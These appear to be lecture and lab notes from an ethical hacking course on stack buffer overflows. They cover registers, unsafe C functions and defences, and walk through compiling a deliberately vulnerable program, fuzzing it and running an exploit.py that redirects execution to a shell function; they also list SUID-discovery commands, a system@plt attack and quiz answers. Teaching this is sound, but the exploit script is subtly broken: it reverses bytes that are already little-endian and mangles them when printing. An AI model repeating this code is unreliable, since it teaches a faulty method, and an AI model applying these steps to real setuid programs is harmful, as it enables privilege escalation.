# Week 10 — Introduction to Binary Exploitation

**Module:** UOP M31880
**Lecturer:** Tobi Fajana

## Overview

This week introduces binary exploitation, focusing on stack-based buffer overflow attacks. Topics include binary file structure, memory architecture, vulnerable C functions, and practical exploitation techniques using tools like GDB, objdump, and Python for exploit development.

## Lecture Content

### Recap: Key Concepts
- Binary file structure and assembly language
- Computer architecture fundamentals
- The trusted input problem
- Buffer overflow vulnerabilities
- Stack-based buffer overflow exploitation

### Prerequisites
- Basic C programming
- Python scripting
- Some assembly language knowledge

### CIA Triad
Review of Confidentiality, Integrity, and Availability principles in security.

### Assessment Areas
- **Human:** Social engineering, user awareness
- **Application:** Code vulnerabilities, input validation
- **Host:** Operating system, configurations
- **Network:** Traffic analysis, network protocols

### Finding Files and SUID Discovery
- **Finding files:** `find`, `locate`, `which`
- **SUID/SGID discovery commands:**
  - `find / -perm -u=s -type f 2>/dev/null`
  - `find / -perm -4000 2>/dev/null`

### Essential Tools

| Tool | Purpose |
|------|---------|
| `cat` | Read file contents |
| `strings` | Extract readable strings from binaries |
| `xxd` | Hexadecimal dump |
| `vi` | Text editor |
| `gcc` | C compiler |
| `objdump` | Binary disassembly and analysis |
| `dmesg` | Kernel messages (crash analysis) |
| `gdb` | Debugger |
| `gdb-peda` | GDB enhancement for exploit development |
| `python3` | Exploit development scripting |

### Binary Files
- **Structure:** Sequential bytes containing instructions and data
- **Formats:** EXE (Windows), ELF (Linux)
- **Architecture:** 32-bit (4 bytes), 64-bit (8 bytes)

### Memory Layout
When a binary is executed, it is loaded into memory with three main sections:
- **Registers:** Fast storage locations in CPU
- **Code:** Program instructions
- **Stack:** Function calls, local variables, parameters

### Registers

**Register Sizes:**
- 8-bit (legacy)
- 32-bit (prefix: E)
- 64-bit (prefix: R)

**Register Types:**

1. **General Purpose Registers:**
   - **Data Registers:**
     - `(E/R)AX` — Accumulator (arithmetic operations)
     - `(E/R)BX` — Base (addressing)
     - `(E/R)CX` — Count (loop operations)
     - `(E/R)DX` — Data (I/O operations)
   - **Pointer Registers:**
     - `IP` — Instruction Pointer (next instruction address)
     - `SP` — Stack Pointer (current top of stack)
     - `BP` — Base Pointer (subroutine reference point)
   - **Index Registers:** Used for indexed addressing

2. **Control Registers:** Program execution control

3. **Segment Registers:** Memory segmentation

### Buffer Overflow Fundamentals

**What is a Buffer?**
Temporary memory storage for data.

**Buffer Overflow:**
When data extends beyond its intended memory location, it can:
- Cause program crashes
- Overwrite adjacent memory
- Be manipulated to execute unintended functions
- Allow injection and execution of attacker-controlled code

**Types of Buffer Overflow:**
- **Stack-based:** Overflow in stack memory
- **Heap-based:** Overflow in dynamically allocated memory
- **Integer overflow:** Arithmetic operation exceeds integer limits
- **Unicode overflow:** Unicode string handling vulnerabilities

### The Stack
The stack saves temporary data including:
- Function parameters
- Local variables
- Return addresses for function calls

### Vulnerable C Functions
Functions that do NOT perform bounds checking:
- `gets()` — Reads input without size limits
- `strcpy()` — Copies strings without bounds checking
- `scanf()` — Can read more data than allocated

### Defense Mechanisms
- **ASLR (Address Space Layout Randomization):** Randomizes memory addresses to make exploitation harder
- **DEP (Data Execution Prevention):** Marks memory pages as non-executable
- **SEH (Structured Exception Handling):** Windows exception handling protection
- **Patching:** Regular software updates
- **Safe Programming:** Using secure functions (e.g., `fgets()`, `strncpy()`)
- **Input Validation:** Checking and sanitizing user input
- **Least Privilege:** Running programs with minimal permissions

## Lab Content

### Understanding Vulnerable Code

**Example: PasswordChecker Program**

The vulnerable program contains three functions:
- `main()` — Entry point
- `VerifyPassword()` — Contains vulnerable buffer
- `GiveShell()` — Target function to execute

**Vulnerability:** The `gets()` function doesn't perform bounds checking, allowing buffer overflow.

### Compiling Vulnerable Code

```bash
gcc -m32 -fno-stack-protector -no-pie -o PasswordChecker PasswordChecker.c
```

**Compilation flags:**
- `-m32` — Compile as 32-bit binary
- `-fno-stack-protector` — Disable stack protection
- `-no-pie` — Disable Position Independent Executable

### Fuzzing the Application

**Initial test:**
```python
python3 -c "print('A' * 64)"
```

**Pattern generation for offset discovery:**
```python
python3 -c "print('A' * 64 + 'BBBBCCCCDDDDEEEE')"
```

Continue increasing input until segmentation fault occurs.

### Investigating the Crash

```bash
dmesg | tail
```

Look for segfault address (e.g., `segfault at 45454545`):
- `45454545` in hex = `EEEE` in ASCII
- This confirms the Instruction Pointer (IP) has been overwritten

### Finding Function Addresses

```bash
objdump -d PasswordChecker
```

Locate the address of `GiveShell()` function in the disassembly output.

### Creating the Exploit

**exploit.py:**
```python
#!/usr/bin/env python3

# Address of GiveShell function (example: 0x08049182)
address_of_GiveShell = b"\x82\x91\x04\x08"

# Payload: padding + offset + return address (little endian)
payload = b"A" * 64 + b"BBBBCCCCDDDD" + address_of_GiveShell[::-1]

print(payload.decode('latin-1'))
```

**Note:** Addresses are stored in little-endian format (reversed byte order).

### Exploiting the Vulnerability

```bash
(python3 exploit.py; cat) | ./PasswordChecker
```

This command:
1. Generates the payload
2. Keeps stdin open with `cat`
3. Pipes both to the vulnerable program
4. Gains shell access if successful

### Advanced Exploitation: Using system@plt

**Steps:**
1. Use GDB-PEDA to analyze the binary
2. Find the address of `system@plt` function
3. Locate `/bin/sh` string in memory
4. Construct payload with system address and /bin/sh parameter
5. Execute to gain shell access

**GDB-PEDA advantages:**
- Enhanced visualization
- Pattern creation and offset finding
- Memory search capabilities
- Exploit development helpers

### Challenge

**Phoenix Exploit Education:**
https://exploit.education/phoenix/

A progressive series of binary exploitation challenges covering:
- Stack overflows
- Format strings
- Heap exploitation
- Return-oriented programming (ROP)

## Practice Questions

1. **Q:** Which `objdump` option provides assembly code?
   **A:** `-d`

2. **Q:** Which tool is used to disassemble and analyze binary files?
   **A:** `objdump`

3. **Q:** What is the first target in a stack overflow attack?
   **A:** Return address

4. **Q:** What is the benefit of using `dmesg` or `gdb-peda` after a crash?
   **A:** Identify the overwritten return address

5. **Q:** Which of the following does NOT prevent buffer overflow?
   **A:** Regular expression validation

6. **Q:** Which tool is used for debugging stack buffer overflow?
   **A:** GDB

7. **Q:** What type of memory is dynamically allocated?
   **A:** Heap

8. **Q:** Which command shows the file type in Linux?
   **A:** `file`

9. **Q:** What is a stack buffer overflow?
   **A:** Writing more data than a buffer can hold

10. **Q:** What describes a stack buffer overflow?
    **A:** Writing more data than a buffer can hold

11. **Q:** What is the security issue with `gets()`?
    **A:** No bounds checking

12. **Q:** How can you view static functions of an executable?
    **A:** `objdump`, `gdb`

13. **Q:** What is the purpose of ASLR?
    **A:** Obfuscate and randomize memory addresses

14. **Q:** Which defense mechanism marks memory pages as non-executable?
    **A:** DEP (Data Execution Prevention)

15. **Q:** What is the goal of overwriting the return address?
    **A:** Gain control of execution flow

16. **Q:** What is the purpose of fuzzing?
    **A:** Identify vulnerabilities with random or malformed inputs

17. **Q:** Which tool is a GDB enhancement for exploit development?
    **A:** PEDA

18. **Q:** Which memory area contains function parameters?
    **A:** Stack

19. **Q:** What is the purpose of the `system()` function?
    **A:** Execute shell commands via the default interpreter

20. **Q:** What are the roles of IP, SP, and BP registers?
    **A:** IP = next instruction, SP = top of stack, BP = subroutine reference

## Recommended TryHackMe Labs

| Room Name | URL | Difficulty | Access | Description |
|-----------|-----|------------|--------|-------------|
| Buffer Overflow Prep | https://tryhackme.com/room/bufferoverflowprep | Easy | Sub | Step-by-step buffer overflow exploitation practice |
| Intro to x86-64 | https://tryhackme.com/room/introtox8664 | Easy | Free | x86-64 assembly basics, registers, memory layout |
| Overpass | https://tryhackme.com/room/overpass | Easy | Free | CTF with binary analysis and privilege escalation |
| Brainpan 1 | https://tryhackme.com/room/brainpan | Medium | Free | Classic buffer overflow CTF challenge |
| Linux PrivEsc | https://tryhackme.com/room/linuxprivesc | Medium | Free | SUID exploitation, covers finding SUID binaries |

## Key Takeaways

- Buffer overflows occur when data exceeds allocated memory boundaries
- The stack stores function parameters, local variables, and return addresses
- Vulnerable C functions like `gets()`, `strcpy()`, and `scanf()` don't perform bounds checking
- Exploitation involves overwriting the return address to redirect program execution
- Tools like GDB, objdump, and Python are essential for exploit development
- Modern defenses include ASLR, DEP, stack canaries, and safe programming practices
- Understanding assembly, registers, and memory layout is crucial for binary exploitation

---

*Week 10 of 12 — UOP M31880 Ethical Hacking*
